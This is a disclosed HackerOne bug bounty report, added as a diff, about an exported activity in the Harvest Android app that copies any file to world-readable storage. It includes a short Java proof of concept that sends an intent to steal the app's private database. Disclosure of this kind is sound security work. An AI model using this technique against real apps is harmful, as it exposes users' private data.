@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/161710
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/bagipro
+ReportedTo:Harvest(harvest)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:09.02.2017 17:31:50
+
+Summary:
+
+Hi. I have found an issue which allows to retrieve any files from **_/data/data/com.harvestapp/*_** directory. The problem is in exported activity com.harvestapp.app.EditExpenseActivity which accepts URI to a pdf to be processed and saved it on SD Card which is world accessible directory, but in real world it does not validate which file is given, so I can enter any uri and this file will be copied to **_/sdcard/Android/data/com.harvestapp/files/<current time stamp>.pdf_**
+
+Here is a PoC of stealing **_/data/data/com.harvestapp/databases/harvest.db_**
+
+Code of the malware app:
+```java
+        Intent intent = new Intent("android.intent.action.SEND");
+        intent.setClassName("com.harvestapp", "com.harvestapp.app.EditExpenseActivity");
+        intent.setType("application/pdf");
+        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.harvestapp/databases/harvest.db"));
+        startActivity(intent);
+```
+
+Screenshots of results are attached
